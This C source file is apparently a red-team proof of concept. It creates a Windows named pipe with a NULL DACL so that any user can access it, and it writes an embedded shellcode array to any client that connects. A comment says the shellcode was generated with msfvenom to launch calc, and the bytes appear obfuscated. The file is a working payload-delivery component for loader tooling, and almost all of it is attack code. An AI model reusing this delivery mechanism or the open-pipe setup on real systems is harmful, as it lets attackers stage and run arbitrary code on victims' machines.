#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "Advapi32.lib")

// msfvenom -p windows/x64/exec cmd=calc -f raw > calc.bin
BYTE g_Payload[ ] = {
	0x6e,0xcf,0xa2,0xa6,0x62,0x6f,0xe1,0x42,0x92,0x87,0x60,0x13,0xd3,0xd7,0x73,0x13,0xc4,0xcf,0x10,
	0x90,0xf7,0xcf,0xaa,0x10,0xf2,0xcf,0xaa,0x10,0x8a,0xcf,0xaa,0x10,0xb2,0xcf,0xaa,0x30,0xc2,0xcf,
	0x2e,0xf5,0xd8,0xcd,0x6c,0x73,0x5b,0xcf,0x10,0x82,0x3e,0xbb,0x40,0x3e,0x90,0xab,0x01,0x03,0x53,
	0x4e,0x2c,0x03,0x93,0x46,0xc3,0xaf,0xc0,0xc6,0x70,0x0a,0x19,0xd5,0x01,0xc9,0xd0,0xbb,0x69,0x43,
	0x42,0x0c,0xa1,0xca,0x92,0x87,0x21,0x0a,0x17,0x47,0x55,0x25,0xda,0x86,0xf1,0x12,0x19,0xcf,0x39,
	0x06,0x19,0xc7,0x01,0x0b,0x93,0x57,0xc2,0x14,0xda,0x78,0xe8,0x03,0x19,0xb3,0xa9,0x0a,0x93,0x51,
	0x6c,0x73,0x5b,0xcf,0x10,0x82,0x3e,0xc6,0xe0,0x8b,0x9f,0xc6,0x20,0x83,0xaa,0x67,0x54,0xb3,0xde,
	0x84,0x6d,0x66,0x9a,0xc2,0x18,0x93,0xe7,0x5f,0x79,0x06,0x19,0xc7,0x05,0x0b,0x93,0x57,0x47,0x03,
	0x19,0x8b,0x69,0x06,0x19,0xc7,0x3d,0x0b,0x93,0x57,0x60,0xc9,0x96,0x0f,0x69,0x43,0x42,0xc6,0x79,
	0x03,0xca,0xd9,0x78,0x18,0xd3,0xdf,0x60,0x1b,0xd3,0xdd,0x69,0xc1,0x7e,0xa7,0x60,0x10,0x6d,0x67,
	0x79,0x03,0xcb,0xdd,0x69,0xc9,0x80,0x6e,0x76,0xbd,0x6d,0x78,0x7c,0x0a,0x28,0x86,0x21,0x42,0x92,
	0x87,0x21,0x42,0x92,0xcf,0xac,0xcf,0x93,0x86,0x21,0x42,0xd3,0x3d,0x10,0xc9,0xfd,0x00,0xde,0x97,
	0x29,0x77,0x94,0xe0,0xc4,0xc6,0x9b,0xe4,0x07,0x3a,0xbc,0xbd,0x47,0xcf,0xa2,0x86,0xba,0xbb,0x27,
	0x3e,0x98,0x07,0xda,0xa2,0xe7,0x82,0x9a,0x05,0x81,0xf5,0x4e,0x28,0x92,0xde,0x60,0xcb,0x48,0x78,
	0xf4,0x21,0xf3,0xeb,0x42,0x42
};

int PrintHelp( )
{
	puts( "[*] Usage: Server.exe \\\\.\\pipe\\[PIPENAME]" );
	return ( 0 );
}

// https://forums.codeguru.com/showthread.php?155318-Named-Pipes-over-a-network
VOID InitializeSecurityDescriptor( PSECURITY_ATTRIBUTES sa )
{
	SECURITY_DESCRIPTOR* sd;

	sd = ( SECURITY_DESCRIPTOR* ) LocalAlloc( LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH );

	InitializeSecurityDescriptor( sd, SECURITY_DESCRIPTOR_REVISION );

	SetSecurityDescriptorDacl( sd, TRUE, ( PACL ) NULL, FALSE );

	sa->nLength = sizeof( SECURITY_ATTRIBUTES );
	sa->bInheritHandle = TRUE;
	sa->lpSecurityDescriptor = sd;
}

int main( int argc, char* argv[ ] )
{
	HANDLE				hNamedPipeServer = NULL;
	HANDLE				hThread = NULL;
	BOOL				bStatus = FALSE;
	DWORD				dwBytesRead = 0;
	PVOID				pBuffer = NULL;
	SECURITY_ATTRIBUTES		sa;

	if ( argc < 2 )
		return PrintHelp( );

	InitializeSecurityDescriptor( &sa );

	hNamedPipeServer = CreateNamedPipeA( argv[ 1 ],				// pipename
					     PIPE_ACCESS_DUPLEX,		// read/write access
					     PIPE_TYPE_MESSAGE |		// message type mode
					     PIPE_READMODE_MESSAGE |	        // message read mode
					     PIPE_WAIT,				// blocking mode
					     PIPE_UNLIMITED_INSTANCES,	        // max instances
					     sizeof( g_Payload ),		// write buffer size
					     sizeof( g_Payload ),		// read buffer size
					     0,					// use default wait time
 					     &sa );				// set security attributes to anyone
	if ( hNamedPipeServer == INVALID_HANDLE_VALUE )
	{
		printf( "[!] CreateNamedPipeA Failed (%d).\n", GetLastError( ) );
		return ( 0 );
	}

	printf( "[+] Created Named Pipe Listener: %s\n", argv[ 1 ] );

	// waiting for client connection.
	bStatus = ConnectNamedPipe( hNamedPipeServer, NULL );
	if ( !bStatus )
	{
		printf( "[!] ConnectNamedPipe Failed (%d).\n", GetLastError( ) );
		CloseHandle( hNamedPipeServer );
		return ( 0 );
	}

	puts( "[+] Writing Payload to Named Pipe." );

	if ( !WriteFile( hNamedPipeServer, g_Payload, sizeof( g_Payload ), NULL, NULL ) )
	{
		printf( "[!] WriteFile Failed (%d).\n", GetLastError( ) );
		CloseHandle( hNamedPipeServer );
		return ( 0 );
	}

	puts( "[+] Done." );
	system( "pause" );
	return ( 0 );
}
